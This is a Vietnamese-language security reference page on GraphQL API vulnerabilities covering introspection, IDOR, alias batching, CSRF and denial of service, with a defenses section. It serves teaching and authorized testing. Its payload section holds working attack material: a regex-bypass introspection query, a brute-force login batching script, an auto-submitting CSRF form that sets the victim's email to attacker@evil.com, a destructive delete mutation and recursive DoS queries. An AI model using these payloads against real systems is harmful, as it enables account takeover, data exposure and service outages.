# GraphQL API Vulnerabilities

> Introspection, batching và lỗi resolver làm lộ dữ liệu hoặc cho phép DoS/IDOR. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/graphql_api.md`](../../../../Troubleshooting_Guide/graphql_api.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** OWASP API Top 10
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
GraphQL phơi bày một endpoint duy nhất, có kiểu mạnh (strongly-typed), nơi client yêu cầu chính xác
các trường mình muốn. Sự linh hoạt đó tạo ra bề mặt tấn công riêng: introspection làm lộ toàn bộ
schema, alias/batching nhân bội khối lượng công việc trong một request, và mỗi resolver cấp trường
cần phân quyền riêng — khe hở ở đó dẫn tới IDOR, lộ dữ liệu, và từ chối dịch vụ.

## Cơ chế hoạt động (How it works)
Kẻ tấn công kiểm soát chính truy vấn — những trường nào, ID đối tượng nào, và bao nhiêu thao tác đi
cùng trong một request HTTP. Ứng dụng sai lầm khi để introspection bật trong môi trường production
(trao luôn bản đồ mọi kiểu và trường), khi chỉ kiểm tra xác thực ở gốc truy vấn thay vì từng resolver
(khiến một trường lồng nhau hoặc trường ngang cấp làm lộ dữ liệu), khi cho phép aliasing/lồng nhau
không giới hạn (vô hiệu rate limit và làm cạn kiệt máy chủ), và khi chấp nhận
`application/x-www-form-urlencoded` mà không có bảo vệ CSRF nên một mutation có thể bị kích hoạt
liên-site (cross-site).

## Tác động (Impact)
Lộ schema của các trường ẩn/nhạy cảm (`password`, `apiKey`, các mutation nội bộ); IDOR và đọc/ghi
vi phạm phân quyền đối tượng giữa các người dùng; brute force quy mô lớn qua batching bằng alias để
né các bộ giới hạn theo-từng-request; thay đổi trạng thái do CSRF; và từ chối dịch vụ từ các truy vấn
lồng sâu hoặc đệ quy vòng. Mức nghiêm trọng dao động từ trung bình (rò rỉ thông tin qua introspection)
đến nghiêm trọng (vượt xác thực, mutation phá hủy).

## Cách phát hiện (How to detect)
- `{__typename}` trả về `{"data":{"__typename":"query"}}` — xác nhận là endpoint GraphQL.
- Một truy vấn introspection đầy đủ (`__schema`) thành công — introspection đang bật.
- Lỗi cấp trường nhưng vẫn trả về `data` một phần cho thấy việc phân quyền được kiểm tra không đồng đều.
- Một POST form-encoded (`Content-Type: application/x-www-form-urlencoded`) thực thi được truy vấn báo
  hiệu thiếu bảo vệ CSRF.
- Phản hồi chậm/timeout với truy vấn lồng nhau hoặc đệ quy vòng cho thấy không giới hạn độ sâu/độ phức tạp.

## Khai thác (tóm tắt) (Exploitation)
Định vị endpoint, xác nhận bằng `__typename`, rồi trích xuất schema qua introspection (dùng mẹo newline
`%0a` nếu một regex `__schema{` ngây thơ chặn nó). Khai thác schema để tìm trường nhạy cảm và mutation
ẩn, rồi đi tuần tự qua các ID để đọc đối tượng của người dùng khác. Gộp nhiều lần thử `login` dưới các
alias để brute-force vượt rate limit, và gửi các mutation form-encoded để kiểm tra CSRF. Leo thang lên
các mutation phá hủy hoặc DoS qua truy vấn sâu/đệ quy vòng. Payload đầy đủ nằm trong phần Payload và tài
liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)

> Được chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Tìm endpoint (Finding the endpoint)

Các vị trí phổ biến để dò:

```bash
/graphql        /api            /api/graphql
/graphql/v1     /v1/graphql     /query
/gql            /graphql/console /graphql/graphiql
/playground     /__graphql
```

Xác nhận GraphQL bằng một truy vấn `__typename` phổ quát:

```http
GET /api?query=query{__typename}
# {"data":{"__typename":"query"}}
```

### Introspection

Trích xuất toàn bộ schema:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields(includeDeprecated: true) {
        name
        args { name type { name } }
        type { name kind ofType { name } }
      }
    }
    directives { name args { name type { name } } }
  }
}
```

Vượt qua khối regex `__schema{` ngây thơ bằng newline (`%0a` tách token):

```http
GET /api?query=query+IntrospectionQuery{__schema%0a{queryType{name}}}
```

### Liệt kê ID & trường riêng tư (ID enumeration & private fields)

Đi tuần tự qua các ID và yêu cầu các trường mà introspection để lộ nhưng giao diện che giấu (`password`, `postPassword`, `apiKey`, v.v.):

```graphql
query { getBlogPost(id: 1) { id title } }
query { getBlogPost(id: 3) { id title postPassword } }
query { getUser(id: 1) { id username password } }
```

Các từ khóa trường nhạy cảm để grep trong schema: `password, token, secret, key, credential, ssn, credit, private, internal, admin, postPassword, apiKey, authToken`.

### Vượt rate-limit qua batching bằng alias (Rate-limit bypass via alias batching)

Alias chạy nhiều thao tác trong một request, vô hiệu các bộ giới hạn theo-từng-request:

```graphql
mutation {
  attempt0: login(input: {username: "carlos", password: "123456"}) { token success }
  attempt1: login(input: {username: "carlos", password: "password"}) { token success }
  # ... up to
  attempt99: login(input: {username: "carlos", password: "letmein"}) { token success }
}
```

```python
passwords = ["123456", "password", "qwerty", "abc123"]
query = 'mutation { '
for i, pwd in enumerate(passwords):
    query += f'attempt{i}: login(input:{{username:"carlos",password:"{pwd}"}}){{token success}} '
query += '}'
```

### CSRF qua GraphQL (CSRF over GraphQL)

Khi máy chủ chấp nhận `application/x-www-form-urlencoded` và bỏ qua kiểm tra CSRF:

```html
<form action="https://TARGET/graphql/v1" method="POST" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="query"
         value='mutation{changeEmail(input:{email:"attacker@evil.com"}){email}}' />
</form>
<script>document.forms[0].submit();</script>
```

Với biến (variables), form-encoded:

```http
query=mutation+changeEmail($input:ChangeEmailInput!){changeEmail(input:$input){email}}&operationName=changeEmail&variables={"input":{"email":"attacker@evil.com"}}
```

### Mutation phá hủy (Destructive mutations)

```graphql
mutation { deleteOrganizationUser(input: {id: 3}) { user { id } } }
```

### Từ chối dịch vụ (Denial of service)

Các lựa chọn lồng sâu theo lô nhân bội khối lượng công việc của máy chủ:

```graphql
query {
  batch1: users(first: 1000) { posts(first: 1000) { comments(first: 1000) { author { posts { id } } } } }
  batch2: users(first: 1000) { posts(first: 1000) { comments(first: 1000) { author { posts { id } } } } }
}
```

Fragment đệ quy vòng gây đệ quy không giới hạn:

```graphql
fragment UserFields on User { id posts { author { ...UserFields } } }
query { user(id: 1) { ...UserFields } }
```

### Dò bằng cURL (cURL probes)

```bash
# confirm endpoint
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}'
# introspection
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name}}}"}'
# CSRF test (form-encoded accepted?)
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'query={__typename}'
# introspection regex bypass
curl -s https://TARGET/graphql -X POST -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery{__schema%0a{queryType{name}}}"}'
```

## Phòng chống (Defenses)
1. **Tắt introspection trong production** và từ chối các truy vấn `__schema`/`__type` (đừng dựa vào
   regex — hãy chặn tính năng này ngay tại máy chủ).
2. **Phân quyền ở cấp resolver/trường**, không chỉ ở gốc truy vấn; mặc định từ chối trên mọi đối tượng
   và mọi trường.
3. **Giới hạn độ sâu, độ phức tạp và aliasing của truy vấn**, và giới hạn hoặc tắt batching để chặn
   brute force và DoS do cạn kiệt tài nguyên.
4. **Bắt buộc bảo vệ CSRF**: chỉ chấp nhận `application/json`, từ chối `application/x-www-form-
   urlencoded`, và xác thực token/origin trên các thao tác thay đổi trạng thái.
5. Rate-limit theo thao tác (đếm các thao tác được alias, không chỉ đếm request), tắt gợi ý trường
   (field suggestions), và kiểm tra/whitelist các đối số đầu vào.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=GraphQL+API+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=GraphQL+API+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=GraphQL+API+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=GraphQL+API+Vulnerabilities
- **OSV** — https://osv.dev/list?q=GraphQL+API+Vulnerabilities
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `GraphQL API Vulnerabilities <sản phẩm> <phiên bản>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2021-32847` — OneDev: phơi bày GraphQL/API cho phép truy cập không xác thực tới chức năng
  nhạy cảm.
- _Sự cố kinh điển: endpoint GraphQL của GitLab đã có nhiều lần lộ dữ liệu nhạy cảm do phân quyền cấp
  trường không đầy đủ — một lớp IDOR GraphQL thực tế tiêu biểu._
- _Sự cố kinh điển: introspection-bật-trong-production thường xuyên làm lộ các mutation/trường ẩn trong
  các báo cáo bug-bounty; lạm dụng query-batching/độ sâu là mô hình DoS GraphQL chuẩn (xem các advisory
  về giới hạn độ sâu của graphql-js trên cơ sở dữ liệu GitHub Advisory)._

## Tham khảo (References)
- PortSwigger Web Security Academy — GraphQL API vulnerabilities.
- OWASP GraphQL Cheat Sheet.
- OWASP API Security Top 10 (2023); đặc tả GraphQL (graphql.org/learn).
